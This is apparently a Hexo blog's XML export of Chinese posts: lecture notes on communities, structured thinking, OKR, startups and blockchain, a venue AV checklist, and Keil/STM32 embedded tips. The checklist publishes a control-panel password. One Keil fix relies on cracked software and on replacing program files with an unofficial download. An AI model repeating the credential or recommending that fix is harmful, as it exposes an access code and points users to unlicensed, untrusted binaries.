<h3 id="蒸发效应"><a href="#蒸发效应" class="headerlink" title="蒸发效应"></a>蒸发效应</h3><p>社群中只有一位大牛，单方面向普通人分享，时间长了，大牛认为得到的价值不大，离开了，大牛一走，普通人认为自己的问题得不到解决，也就跟着走了，渐渐群就没活力死掉了</p>
<h3 id="咖啡馆效应"><a href="#咖啡馆效应" class="headerlink" title="咖啡馆效应"></a>咖啡馆效应</h3><p>国外的艺术家特别喜欢泡咖啡馆，各种人在一起交流讨论分享头脑中的闪光点，最后都受益匪浅舍不得离开这样的文化氛围，一个社群有这样的效应，大家在社群里畅所欲言，又有共同遵守的规范</p>
<h3 id="好的社群第一个特征就是创造链接"><a href="#好的社群第一个特征就是创造链接" class="headerlink" title="好的社群第一个特征就是创造链接"></a>好的社群第一个特征就是创造链接</h3><p>如果没有总在身边看到他的熟悉感就不会有真的社群</p>
<p>弱关系创造链接，强关系创造合作<br>能创造出强关系的社群才是好社群</p>
<p>先创造链接<br>再培养信任</p>
<h4 id="如何创造信任"><a href="#如何创造信任" class="headerlink" title="如何创造信任"></a>如何创造信任</h4><ul>
<li>群分享</li>
<li>群金句</li>
<li>群答疑</li>
<li>线下聚会</li>
<li>线下交流</li>
<li>线下活动</li>
<li>合作活动</li>
<li>合作写稿</li>
<li>合作公益</li>
</ul>
<p>坚持–产生仪式感<br>话题–带来新鲜感<br>组合–引来潜水党</p>
<p>好的社群产生情感认同<br>能忍受社群灌水、刷屏<br>只因为你对这个社群产生情感认同</p>
<p>好的社群让群员有回报<br>坏的社群让群员有xx</p>
<h4 id="创造社群认同的三个维度"><a href="#创造社群认同的三个维度" class="headerlink" title="创造社群认同的三个维度"></a>创造社群认同的三个维度</h4><ul>
<li>以产品为纽带 | 好玩，产品有足够复杂</li>
<li>以情感为纽带 | 好暖，有趣有料有意思的人多</li>
<li>以利益为纽带 | 好赚，激励多，福利多，机会多</li>
</ul>
]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Course</category>
      </categories>
      <tags>
        <tag>讲座笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>结构思考力</title>
    <url>/blogs/2018-04-15-jiegousikaoli/</url>
    <content><![CDATA[<p>思考更清晰、表达更有力</p>
<p>丹宁 - 一片丹心 宁静致远</p>
<ul>
<li>生涯规划师</li>
<li>心理咨询师</li>
<li>培训师</li>
</ul>
<hr>
<ul>
<li>[理解] - 隐形思维显性化<ul>
<li>[识别] - 信息中事实及观点</li>
<li>[判断] - 事实观点对应关系</li>
<li>[概括] - 简洁概括所有内容</li>
</ul>
</li>
<li>[重构] - 显性思维结构化<ul>
<li>[论] - 结论先行</li>
<li>[证] - 以上统下</li>
<li>[类] - 归类分组</li>
<li>[比] - 逻辑递归</li>
</ul>
</li>
<li>[呈现] - 结构思维形象化<ul>
<li>[配] - 配关系</li>
<li>[得] - 得图示</li>
<li>[上] - 上包装</li>
</ul>
</li>
</ul>
<hr>
<h1 id="模块一-透过结构看思考"><a href="#模块一-透过结构看思考" class="headerlink" title="模块一 透过结构看思考"></a>模块一 透过结构看思考</h1><ul>
<li>我是谁、从哪来、到哪去？</li>
<li>有粘性的记忆力是有结构的</li>
<li>事实只有一个，但是看问题获得信息不一样</li>
<li>很多时候通过经验来获得答案，而且可以被一个答案禁锢住</li>
<li>《金字塔原理》</li>
<li>有思路想是否全面清晰</li>
</ul>
<p>三层次模型<br>输入 -&gt; 理解、重构、呈现 -&gt; 输出</p>
<p>万能公式：</p>
<blockquote>
<p>在____的基础上，从____、____、____等方面，讲述了____。</p>
</blockquote>
<p>事实观点</p>
<p>用做商务沟通</p>
<p>7+-2<br>5+-2</p>
<h2 id="MECE原则"><a href="#MECE原则" class="headerlink" title="MECE原则"></a>MECE原则</h2><table>
<thead>
<tr>
<th align="center">MC</th>
<th align="center">CE</th>
</tr>
</thead>
<tbody><tr>
<td align="center">相互独立</td>
<td align="center">完全穷尽</td>
</tr>
</tbody></table>
<p>戴戒指<br>清热解毒（情侣、热恋、结婚、孤独）</p>
<h1 id="模块二-透过结构看表达"><a href="#模块二-透过结构看表达" class="headerlink" title="模块二 透过结构看表达"></a>模块二 透过结构看表达</h1><h1 id="模块三-透过结构看问题"><a href="#模块三-透过结构看问题" class="headerlink" title="模块三 透过结构看问题"></a>模块三 透过结构看问题</h1><h1 id="模块四-透过结构看共识"><a href="#模块四-透过结构看共识" class="headerlink" title="模块四 透过结构看共识"></a>模块四 透过结构看共识</h1>]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Course</category>
      </categories>
      <tags>
        <tag>讲座笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>OKR介绍</title>
    <url>/blogs/2018-04-15-okr/</url>
    <content><![CDATA[<h1 id="first"><a href="#first" class="headerlink" title="first"></a>first</h1><ul>
<li>如何管理人</li>
<li>如何管理牛人</li>
</ul>
<h1 id="next"><a href="#next" class="headerlink" title="next"></a>next</h1><table>
<thead>
<tr>
<th align="center"></th>
<th align="center">传统：指令管理</th>
<th align="center">当今：目标管理</th>
</tr>
</thead>
<tbody><tr>
<td align="center">历史背景</td>
<td align="center">劳动力密集型</td>
<td align="center">知识密集型</td>
</tr>
<tr>
<td align="center">思想内核</td>
<td align="center">衡量</td>
<td align="center">激励</td>
</tr>
<tr>
<td align="center">推动力</td>
<td align="center">自上向下</td>
<td align="center">自下而上</td>
</tr>
<tr>
<td align="center">工具</td>
<td align="center">KPI（关键绩效指标）</td>
<td align="center">OKR（目标与关键成果法</td>
</tr>
<tr>
<td align="center">使用背景</td>
<td align="center">工厂<br>大公司的底层部门</td>
<td align="center">创业公司<br>大公司的核心层</td>
</tr>
</tbody></table>
<h2 id="制定-OKR会议"><a href="#制定-OKR会议" class="headerlink" title="制定 - OKR会议"></a>制定 - OKR会议</h2><p>OKR三原则</p>
<ul>
<li>平等协商</li>
<li>极度透明</li>
<li>求同存异</li>
</ul>
<h2 id="执行-实施过程"><a href="#执行-实施过程" class="headerlink" title="执行 - 实施过程"></a>执行 - 实施过程</h2><h2 id="复盘-打分总结"><a href="#复盘-打分总结" class="headerlink" title="复盘 - 打分总结"></a>复盘 - 打分总结</h2><h1 id="next2"><a href="#next2" class="headerlink" title="next2"></a>next2</h1><h2 id="实践-KR设定"><a href="#实践-KR设定" class="headerlink" title="实践 - KR设定"></a>实践 - KR设定</h2><p>初创团队容易目标太多</p>
]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Course</category>
      </categories>
      <tags>
        <tag>讲座笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>简单随笔</title>
    <url>/blogs/2018-04-08-ideas/</url>
    <content><![CDATA[<h1 id="old"><a href="#old" class="headerlink" title="old"></a>old</h1><ul>
<li>如果养老让老人什么都不干是让他们变得更老，以我自己的想法老人的经验或许是一种财富</li>
<li>讲课可能是把自己没有注意到的道理讲出来，其实自己知道这些东西。老师通过讲述已知却未重视的道理，用达成共识来讲授知识。</li>
<li>好的讲课应该是讲出都不懂而且特别感兴趣的讲出来</li>
<li>辩论可以让方案更加完善，但是消耗时间较长</li>
<li>ap扫mac地址确认位置</li>
<li>摄像头采集人脸</li>
<li>火车站先拿数据，大数据分析</li>
</ul>
<h1 id="2020-08-01-学习一门语言重点要学的几个点"><a href="#2020-08-01-学习一门语言重点要学的几个点" class="headerlink" title="2020.08.01 学习一门语言重点要学的几个点"></a>2020.08.01 学习一门语言重点要学的几个点</h1><ol>
<li>类型</li>
<li>逻辑操作符（实现几个算法）</li>
<li>库函数</li>
<li>内存的申请和释放，垃圾回收机制</li>
<li>线程和进程，包括相应的锁</li>
<li>单例实现</li>
<li>线程池实现</li>
</ol>
]]></content>
      <categories>
        <category>Essay</category>
      </categories>
  </entry>
  <entry>
    <title>创业领导力--龚阿玲</title>
    <url>/blogs/2018-04-08-chuangyeleading/</url>
    <content><![CDATA[<h1 id="first"><a href="#first" class="headerlink" title="first"></a>first</h1><ol>
<li>对你而言，什么是创业？请举3个不同领域的例子</li>
<li>你打算创业吗？为什么？创业最让你感到兴奋的是什么？</li>
<li>你不想创业吗？为什么？创业最让你感到害怕的是什么？</li>
<li>你最熟悉的创业成功者是谁？你认为成功的秘密是什么？</li>
<li>你最熟悉的创业失败者是谁？你认为失败的原因是什么？</li>
<li>小时候你最想成为谁？现在你想成为谁？</li>
<li>你认为创业前需要做哪些准备？需要多少钱？还必须具备哪些条件？</li>
<li>你认为创业成功的标志是什么？</li>
<li>你认为创业需要找怎样的合伙人？你更看重情商还是智商？</li>
<li>如果创业成功，你将获得什么最宝贵的东西？之后想去做什么？</li>
<li>如果创业失败，你将失去什么最宝贵的东西？之后想去做什么？</li>
</ol>
<ul>
<li>学习是做减法<ul>
<li>现在信息很多</li>
<li>学习做减法，筛选信息</li>
<li>时间有限</li>
<li>商业活动抢时间最成功</li>
<li>选择需要的东西，对不需要的说no</li>
</ul>
</li>
<li>找到根源问题，或许很简单</li>
<li>翻译最好是理解后自己写出来</li>
<li>投资人的钱不能随便拿</li>
<li>有机会要思考</li>
<li>失败80-90%因为合伙人的问题</li>
<li>失败的例子更有用，成功的可能有关键因素不会讲出来<ul>
<li>比尔盖茨家庭才让他可以玩电脑</li>
</ul>
</li>
</ul>
<h1 id="next"><a href="#next" class="headerlink" title="next"></a>next</h1><ul>
<li>创业创意更重要，而不是技术</li>
<li>点子不是最重要的，将点子证明出来更重要<ul>
<li>你想出的点子，有100个人已经在做了</li>
</ul>
</li>
<li>做出来才是最重要的，想法不重要</li>
</ul>
<h1 id="end"><a href="#end" class="headerlink" title="end"></a>end</h1><p>把自己变得更好，才能吸引更好的人</p>
]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Course</category>
      </categories>
      <tags>
        <tag>讲座笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>比特币、区块链、代币经济系统--李远师兄分享</title>
    <url>/blogs/2018-04-07-qukuailian/</url>
    <content><![CDATA[<p>Dian 228 李远 SelfSell创始人<br><a href="mailto:&#76;&#x69;&#121;&#117;&#x61;&#x6e;&#64;&#115;&#101;&#108;&#102;&#x73;&#101;&#x6c;&#x6c;&#x2e;&#99;&#x6f;&#x6d;">&#76;&#x69;&#121;&#117;&#x61;&#x6e;&#64;&#115;&#101;&#108;&#102;&#x73;&#101;&#x6c;&#x6c;&#x2e;&#99;&#x6f;&#x6d;</a></p>
<h1 id="比特币"><a href="#比特币" class="headerlink" title="比特币"></a>比特币</h1><ul>
<li>定义：种点对点的电子支付系统</li>
<li>隐匿 法外 暴涨</li>
<li>10000000倍</li>
<li>心跳</li>
<li>暴涨暴跌</li>
</ul>
<h1 id="大事记"><a href="#大事记" class="headerlink" title="大事记"></a>大事记</h1><ul>
<li>2008.10 论文发表</li>
<li>2009.01 开始挖矿</li>
<li>2010.05 买披萨</li>
<li>2013.11 历史最高点</li>
<li>2014.02 重大灾难，比特币丢失</li>
<li>2016.01 央行开始研究自己的货币</li>
<li>2017.02 开始暴涨</li>
<li>2017.09.04</li>
<li>2017.12 最高峰</li>
</ul>
<h1 id="产业格局"><a href="#产业格局" class="headerlink" title="产业格局"></a>产业格局</h1><ul>
<li>mining: CPU、GPU、FPGA、ASIC 速度逐渐加快</li>
<li>Exchange: Mt.Gox、Bitfinex、Binance</li>
<li>Coins or ICO: LTC、ETH、Ripple、EOS、SSC</li>
<li>BlockChain: DIgital Assets、SmartContract、DAPP</li>
</ul>
<h1 id="比特币-1"><a href="#比特币-1" class="headerlink" title="比特币"></a>比特币</h1><ul>
<li>平权运动的技术号角</li>
<li>真理？泡沫？骗局？</li>
<li>买币: 参与，才能感知浪潮的脉动</li>
</ul>
<h1 id="区块链"><a href="#区块链" class="headerlink" title="区块链"></a>区块链</h1><ul>
<li>定义: 基于共识协议和加密算法的去中心化分布式账本系统</li>
<li>防篡改 透明 去中心</li>
<li>分布式 <strong>可信</strong> 全共识</li>
<li>脱媒: 去掉中介<ul>
<li>节点到节点</li>
</ul>
</li>
<li>发言加编号来统计人数–区块链</li>
</ul>
<table>
<thead>
<tr>
<th>微信组局</th>
<th>在区块链里的概念</th>
</tr>
</thead>
<tbody><tr>
<td>接龙发帖</td>
<td>链式数据结构</td>
</tr>
<tr>
<td>规则：每个人发帖 &#x3D; 上一个帖子内容 + 下一个编号 + 自己名字</td>
<td>共识机制，根据严格的规则和公开的协议形成</td>
</tr>
<tr>
<td>规则定下来后，大家自发登记</td>
<td>去中心化，没有任何单一用户能够掌控它</td>
</tr>
<tr>
<td>在微信里记录登记情况</td>
<td>点对点对等网络</td>
</tr>
<tr>
<td></td>
<td></td>
</tr>
</tbody></table>
<h2 id="技术栈"><a href="#技术栈" class="headerlink" title="技术栈"></a>技术栈</h2><ul>
<li>储存技术</li>
<li>加密算法</li>
<li>P2P技术</li>
<li>共识算法</li>
</ul>
<h2 id="公私钥对"><a href="#公私钥对" class="headerlink" title="公私钥对"></a>公私钥对</h2><h2 id="共识协议"><a href="#共识协议" class="headerlink" title="共识协议"></a>共识协议</h2><table>
<thead>
<tr>
<th>POW(Proof of Work)</th>
<th>POS(Proof of Stake)</th>
<th>DPOS(Delegate Proof of Stake)</th>
</tr>
</thead>
<tbody><tr>
<td>比腕力</td>
<td>拼财富</td>
<td>攒人品</td>
</tr>
</tbody></table>
<h2 id="网络结构"><a href="#网络结构" class="headerlink" title="网络结构"></a>网络结构</h2><h2 id="变革的意义"><a href="#变革的意义" class="headerlink" title="变革的意义"></a>变革的意义</h2><h2 id="地球村"><a href="#地球村" class="headerlink" title="地球村"></a>地球村</h2><ul>
<li>由于范围变大使得人们相互认识减少，形成欺诈等</li>
<li>实现地球村</li>
</ul>
<h2 id="代币经济系统"><a href="#代币经济系统" class="headerlink" title="代币经济系统"></a>代币经济系统</h2><ul>
<li>以代币为中心的<strong>新&#x2F;旧</strong>经济模型+</li>
</ul>
<table>
<thead>
<tr>
<th>ICO</th>
<th>IEO</th>
<th>IFO</th>
</tr>
</thead>
<tbody><tr>
<td>空投</td>
<td>流通</td>
<td>IMO</td>
</tr>
</tbody></table>
<ul>
<li>Bitcoin 特殊的代币系统 当成资产</li>
<li>Ethreum 去中心的应用开发平台 成为了一个发币平台</li>
<li>Achain 底层链 帮项目做支持工作</li>
<li>SelfSell 投资个人未来价值的平台</li>
</ul>
]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Course</category>
      </categories>
      <tags>
        <tag>讲座笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>火柴人成长之路</title>
    <url>/blogs/2018-04-07-dianshichuangxiao-note/</url>
    <content><![CDATA[<p>讲课老师: 唐德华顾问<br>华中科技大学 经济管理工程系<br>营销</p>
<h1 id="小技巧"><a href="#小技巧" class="headerlink" title="小技巧"></a>小技巧</h1><ol>
<li>艺术和制图</li>
<li>有道理，不一定有真理</li>
<li>火柴人随便，没有细节，不能抗压</li>
<li>玄学</li>
<li>工程师：用工具数据解决问题</li>
<li>情景模拟</li>
<li>组织，团队意识，高效</li>
<li>问和说</li>
<li>统计学</li>
<li>华科学会如何考试，如何看书</li>
<li>说写的艺术</li>
</ol>
<h2 id="问"><a href="#问" class="headerlink" title="问"></a>问</h2><ol>
<li>简单明了</li>
<li>为什么要问</li>
<li>要得到什么消息</li>
</ol>
<h2 id="说-（自我介绍）"><a href="#说-（自我介绍）" class="headerlink" title="说 （自我介绍）"></a>说 （自我介绍）</h2><ol>
<li>记住名字</li>
<li>对象，以听众为主</li>
<li>结构</li>
<li>关键词，故事</li>
</ol>
<h2 id="说写的艺术"><a href="#说写的艺术" class="headerlink" title="说写的艺术"></a>说写的艺术</h2><h3 id="说"><a href="#说" class="headerlink" title="说"></a>说</h3><ol>
<li>别说不懂得东西</li>
</ol>
<h3 id="写"><a href="#写" class="headerlink" title="写"></a>写</h3><ol>
<li>标题</li>
<li>规律和经验</li>
<li>调味品</li>
</ol>
<h1 id="自我审视"><a href="#自我审视" class="headerlink" title="自我审视"></a>自我审视</h1><p>抓住机会</p>
<h2 id="“火柴人意识”常见问题"><a href="#“火柴人意识”常见问题" class="headerlink" title="“火柴人意识”常见问题"></a>“火柴人意识”常见问题</h2><ol>
<li>自以为是<ul>
<li>腾讯被投资因为，把自己的产品印在所有的名片上（QQ号）</li>
</ul>
</li>
<li>不靠谱<ul>
<li>抓住机会</li>
</ul>
</li>
<li>自我管理（四象法 5S管理）<ul>
<li>时间</li>
<li>四象法，紧急+重要</li>
</ul>
</li>
<li>成本意识（找对象游戏）</li>
<li>风险评估（从种树谈起）</li>
<li>解决问题（变议论为行为）<ul>
<li>行动就有机会</li>
<li>不要说太多万一</li>
</ul>
</li>
</ol>
<h2 id="“人情世故”俗话说。。。。。。"><a href="#“人情世故”俗话说。。。。。。" class="headerlink" title="“人情世故”俗话说。。。。。。"></a>“人情世故”俗话说。。。。。。</h2><ol>
<li>做事做人</li>
<li>学会吃小亏<ul>
<li>不要太精明</li>
</ul>
</li>
<li>感恩寻找生命中的贵人<ul>
<li>学会说好话</li>
</ul>
</li>
</ol>
<p>三个工具：微笑，“Excuse me, thank you!”，伸出手！<br>两句话：相互吹捧 自我批评</p>
<h2 id="成本"><a href="#成本" class="headerlink" title="成本"></a>成本</h2><ul>
<li>物质成本</li>
<li>时间成本</li>
<li>机会成本</li>
<li>风险成本</li>
</ul>
<h2 id="什么人能走的更远？情怀？梦想？"><a href="#什么人能走的更远？情怀？梦想？" class="headerlink" title="什么人能走的更远？情怀？梦想？"></a>什么人能走的更远？情怀？梦想？</h2><ul>
<li>价值观和使命感</li>
<li>大海可渡的坚持</li>
<li>坚持为他人解决问题</li>
</ul>
<h2 id="总结：靠谱-自立"><a href="#总结：靠谱-自立" class="headerlink" title="总结：靠谱 自立"></a>总结：靠谱 自立</h2><ul>
<li>事事有找落</li>
<li>有效率</li>
<li>身先士卒 感染他人</li>
<li>到前线去指挥他人</li>
<li>花自己赚的钱</li>
</ul>
<h1 id="入门武功之ABC"><a href="#入门武功之ABC" class="headerlink" title="入门武功之ABC"></a>入门武功之ABC</h1><h2 id="干中学"><a href="#干中学" class="headerlink" title="干中学"></a>干中学</h2><ul>
<li>技多不压身</li>
<li>看一遍不如做一遍</li>
<li>好电影都是下一部</li>
</ul>
<h2 id="团队力量"><a href="#团队力量" class="headerlink" title="团队力量"></a>团队力量</h2><p>协作 + 组织<br>解决用户的问题</p>
<h2 id="节点和系统"><a href="#节点和系统" class="headerlink" title="节点和系统"></a>节点和系统</h2><h2 id="逆向工程"><a href="#逆向工程" class="headerlink" title="逆向工程"></a>逆向工程</h2><h2 id="终身学习-终身修炼"><a href="#终身学习-终身修炼" class="headerlink" title="终身学习-&gt;终身修炼"></a>终身学习-&gt;终身修炼</h2><ul>
<li>像小朋友般好奇</li>
<li>博大精深-技多不压身</li>
<li>融会贯通-自我见解</li>
<li>有字书和无字书</li>
<li>国际视野-外语很重要</li>
<li>新闻里有大财富</li>
</ul>
]]></content>
      <categories>
        <category>Knowledge</category>
        <category>Course</category>
      </categories>
      <tags>
        <tag>讲座笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>场控注意事项</title>
    <url>/blogs/2018-03-31-backgroud-control/</url>
    <content><![CDATA[<h1 id="操作步骤"><a href="#操作步骤" class="headerlink" title="操作步骤"></a>操作步骤</h1><h2 id="启明学院一楼报告厅"><a href="#启明学院一楼报告厅" class="headerlink" title="启明学院一楼报告厅"></a>启明学院一楼报告厅</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><ul>
<li>三台电脑（报告台、视频和音频、主流程ppt）</li>
<li>电脑软件：<ul>
<li>Potplayer（视频播放）</li>
<li>EQ一卡通（LED显示屏）</li>
<li>vMix（拓展屏的骚操作）</li>
</ul>
</li>
<li>VGA转接线</li>
<li>插线板</li>
<li>一台电脑一份资料<ul>
<li>暖场视频</li>
<li>各种音乐</li>
<li>各流程ppt</li>
<li>主流程ppt</li>
</ul>
</li>
<li>各个视频ppt进行一页一页检查</li>
<li>流程彩排记录</li>
<li>报告厅LED显示内容</li>
<li>启明学院大门LED显示内容</li>
<li>确定好谁负责什么<ul>
<li>主席台递话筒</li>
<li>观众席递话筒</li>
<li>报告台ppt切换</li>
<li>主流程ppt切换</li>
<li>VGA切换</li>
<li>音视频播放和音量调节</li>
</ul>
</li>
</ul>
<h3 id="布场"><a href="#布场" class="headerlink" title="布场"></a>布场</h3><p><strong>！！！先拍照，留做最后的对比，场地必须要还原！！！</strong></p>
<ol>
<li>打开电闸，第二排全部打开，第一排只开三基色、LED和显示屏</li>
<li>控制板开启右侧电源，然后点击开始，系统会自动慢慢启动</li>
<li>需要的话打开辅助投影机和后场电视机</li>
<li>需要的话用空调遥控器开空调</li>
<li>话筒电池电量确认</li>
<li>调试话筒音量和音频视频音量</li>
<li>调试各个VGA接口，查看是否有切换的适配延时和缺块问题</li>
<li>音视频电脑把要放的视频音乐打开暂停，设置是否单个循环或列表循环</li>
<li>主流程ppt和各流程ppt打开到准备界面</li>
</ol>
<h3 id="开场"><a href="#开场" class="headerlink" title="开场"></a>开场</h3><ol>
<li>正式开始前放映暖场视频，循环播放</li>
<li>开始过程中随机应变</li>
<li>嘉宾上台放上场音乐</li>
<li>颁奖放颁奖音乐</li>
<li>散场放散场音乐</li>
</ol>
<h3 id="收场"><a href="#收场" class="headerlink" title="收场"></a>收场</h3><ol>
<li>空调关闭</li>
<li>屏幕黑屏</li>
<li>话筒回收</li>
<li>确认电池需不需要买</li>
<li>控制板点击exit</li>
<li>VGA线回收</li>
<li>VGA转接线回收</li>
<li>插线板回收</li>
<li>等报告厅人走完</li>
<li><strong>对比照片，还原场地</strong></li>
<li>关闭电闸，只留下场控室的电源</li>
<li>收场查看是否有遗漏，叫保安关门</li>
</ol>
<h2 id="启明学院十二楼路演区"><a href="#启明学院十二楼路演区" class="headerlink" title="启明学院十二楼路演区"></a>启明学院十二楼路演区</h2><h3 id="准备-1"><a href="#准备-1" class="headerlink" title="准备"></a>准备</h3><ul>
<li>一台电脑（要有HDMI，VGA不管用）</li>
<li>电脑软件：<ul>
<li>Potplayer（视频播放）</li>
<li>vMix（拓展屏的骚操作）</li>
</ul>
</li>
<li>各个视频ppt进行一页一页检查</li>
</ul>
<h3 id="布场-1"><a href="#布场-1" class="headerlink" title="布场"></a>布场</h3><p><strong>！！！先拍照，留做最后的对比，场地必须要还原！！！</strong></p>
<ol>
<li>打开墙上的机器，密码：<em>87558300</em></li>
<li>打开所需要的灯</li>
<li>如果显示屏没有亮，到电闸室查看是否跳闸</li>
<li>需要的话打开旁边墙上的空调</li>
<li>话筒电池电量确认</li>
<li>调试HDMI显示屏是否适配</li>
<li>音视频电脑把要放的视频音乐打开暂停，设置是否单个循环或列表循环</li>
<li>主流程ppt和各流程ppt打开到准备界面</li>
</ol>
<h3 id="开场-1"><a href="#开场-1" class="headerlink" title="开场"></a>开场</h3><ol>
<li>开始过程中随机应变</li>
</ol>
<h3 id="收场-1"><a href="#收场-1" class="headerlink" title="收场"></a>收场</h3><ol>
<li>空调关闭</li>
<li>屏幕黑屏</li>
<li>话筒回收</li>
<li>确认电池需不需要买</li>
<li>控制板点击结束</li>
<li>HDMI线回收</li>
<li><strong>对比照片，还原场地</strong></li>
<li>收场查看是否有遗漏，关灯走人</li>
</ol>
<h1 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h1><h2 id="公共注意事项"><a href="#公共注意事项" class="headerlink" title="公共注意事项"></a>公共注意事项</h2><ul>
<li><strong>收场需要将场地还原，所以布场先拍照</strong></li>
<li>照明关不了可以关电闸</li>
</ul>
<h2 id="启明学院一楼报告厅-1"><a href="#启明学院一楼报告厅-1" class="headerlink" title="启明学院一楼报告厅"></a>启明学院一楼报告厅</h2><ul>
<li>7号VGA线与其他VGA线相互转的时候会有一段适配时间，尽量不要使用</li>
<li>报告台VGA线和主控电脑VGA线用复制屏会缺一块，使用拓展不会有问题</li>
<li>音量调节不能调节到最高，否则会出现啸叫</li>
<li>后场电视机用复制也有可能会出现缺块现象，注意一下</li>
<li>新的设备话筒离得太近会有啸叫</li>
</ul>
<h2 id="创业红娘场控checklist"><a href="#创业红娘场控checklist" class="headerlink" title="创业红娘场控checklist"></a>创业红娘场控checklist</h2><ul>
<li>放映笔要做各种极限测试</li>
<li>场控要提前加入观众群</li>
<li>弹幕的放映由主流程ppt控制者放映</li>
<li>主持人和刘老师对流程的时候场控负责人要在场</li>
</ul>
]]></content>
      <categories>
        <category>Work</category>
      </categories>
  </entry>
  <entry>
    <title>keil5常见编译错误的原因</title>
    <url>/blogs/2018_03_16_keil524_error_warning/</url>
    <content><![CDATA[<p>本博客仅为自己记录所遇到的问题的解决方案，希望有所帮助</p>
<h2 id="程序环境"><a href="#程序环境" class="headerlink" title="程序环境"></a>程序环境</h2><ul>
<li>系统 <code>Windows10 1709</code></li>
<li>软件 <code>keil-mdk arm 5.24</code></li>
<li>语言 <code>C语言</code></li>
</ul>
<h2 id="问题和原因及解决方案"><a href="#问题和原因及解决方案" class="headerlink" title="问题和原因及解决方案"></a>问题和原因及解决方案</h2><h3 id="warnings"><a href="#warnings" class="headerlink" title="warnings"></a>warnings</h3><h4 id="1、函数隐式声明"><a href="#1、函数隐式声明" class="headerlink" title="1、函数隐式声明"></a>1、函数隐式声明</h4><blockquote>
<p>warning: #223-D: function “xxxx()” declared implicitly</p>
</blockquote>
<p>一般为头文件未包含，但是c文件被编译器编译了，但是在函数被调用的地方没有包含头文件，所以报了一个warning。有些时候会被当做空函数执行，有时没有影响，养成习惯包含头文件。</p>
<h3 id="errors"><a href="#errors" class="headerlink" title="errors"></a>errors</h3>]]></content>
      <categories>
        <category>Debug</category>
      </categories>
      <tags>
        <tag>单片机</tag>
      </tags>
  </entry>
  <entry>
    <title>keil5烧写程序后闪退的解决方案</title>
    <url>/blogs/2018_03_13_keil524_quit/</url>
    <content><![CDATA[<p>本博客仅为自己记录所遇到的问题的解决方案，希望有所帮助</p>
<h2 id="问题环境"><a href="#问题环境" class="headerlink" title="问题环境"></a>问题环境</h2><ul>
<li>系统 <code>Windows10 1709</code></li>
<li>软件 <code>keil-mdk arm 5.24</code></li>
<li>单片机 <code>stm32f030c8t6</code></li>
<li>烧写器 <code>jlink-v8</code></li>
</ul>
<h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><p>&emsp;&emsp;keil编译成功，用jlink烧写进片子之后， keil停止工作。经验证代码烧进了片子， 程序可以正常运行。</p>
<h2 id="原因"><a href="#原因" class="headerlink" title="原因"></a>原因</h2><p>&emsp;&emsp;猜测是因为keil是破解版，jlink是盗版的，出现兼容问题。</p>
<h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>替换keil安装目录下的Segger文件:</p>
<ul>
<li>网上下载一个<a href="https://pan.baidu.com/s/1Bl4Q4RQkP-Ba9V8qdO9NFQ">Segger</a>文件替换<code>keil_program\ARM\Segger</code>文件夹下全部内容即可。</li>
</ul>
]]></content>
      <categories>
        <category>Debug</category>
      </categories>
      <tags>
        <tag>单片机</tag>
      </tags>
  </entry>
  <entry>
    <title>stm32cubemx配置介绍</title>
    <url>/blogs/2018_03_16_stm32cubemx_config/</url>
    <content><![CDATA[<p>本博客仅为自己在使用时的总结，希望有所帮助</p>
<h2 id="程序环境"><a href="#程序环境" class="headerlink" title="程序环境"></a>程序环境</h2><ul>
<li>系统 <code>Windows10 1709</code></li>
<li>软件 <code>stm32cubemx 4.25.0</code></li>
<li>编译软件 <code>keil-mdk arm 5.24</code></li>
<li>语言 <code>C语言</code></li>
<li>单片机 <code>stm32f030c8t6</code></li>
</ul>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>stm32cubemx是一款对于stm32系列单片机的可视化编程配置软件，编写stm32系列几乎所有单片机的码农可以尝试这个软件，本文只是自己在使用时的总结，虽然使用的单片机为stm32f030c8t6，但是大体框架还是差不多的，基本可以通用，仅供参考。</p>
<h2 id="新建工程"><a href="#新建工程" class="headerlink" title="新建工程"></a>新建工程</h2><p>打开软件就看到朴实无华的界面（明明是设计太差），中间是一个stm32cube图，左侧是三个蓝色字段：New Project，Load Project，Help。不用想，直接点击New Project，新建工程。</p>
<img src="2018_03_16_01.png" width = "80%" />

<p>之后会先检查网络，然后更新…</p>
<p>然后出现了New Project的选项卡，里面有stm32系列几乎所有芯片，并且包括<code>报价、Flash、RAM、IO数、频率</code>，选中一个型号还可以直接点击上方的datasheet直接下载相应datasheet来参考。选中一个型号的芯片，双击或者点选上方的start project。</p>
<img src="2018_03_16_02.png" width = "80%" />

<p>出现了一个芯片的图，引脚顺序按照实际封装设置的，左侧是各种配置的外设，可以直接点选来配置，而且有相应的freeRTOS以及fatfs的支持，如果芯片支持usb还会有usb的配置选项。并且如果某个外设被配置到一个引脚，影响了其他外设，会直接在相应选项上显示红色，表示不可配置，十分友好。</p>
<img src="2018_03_16_03.png" width = "80%" />

<p>新建工程到这里就结束了。</p>
<h2 id="配置RCC时钟"><a href="#配置RCC时钟" class="headerlink" title="配置RCC时钟"></a>配置RCC时钟</h2><p>工程新建完成后就是配置RCC时钟了，首先要确定芯片有没有外接晶振，一般开发板或者实物都会外接一个8M高速晶振。我就根据外接8M晶振来配置单片机。</p>
<p>首先在列表左侧将<code>RCC</code>下的<code>High Speed Clock(HSE)</code>选为<code>Crystal/Ceramic Resonator</code>，然后在上面大分层中的<code>Clock Configuration</code>页面将<code>input frequency</code>设置为8，将<code>PLL Source Mux</code>点选<code>HSE</code>，然后将<code>HCLK</code>设置为最大48MHz(也可根据自己需要设置)，回车会询问是否自动配置时钟，选择是即可自动将各种时钟配置完成。</p>
<img src="2018_03_21_01.png" width = "80%" />

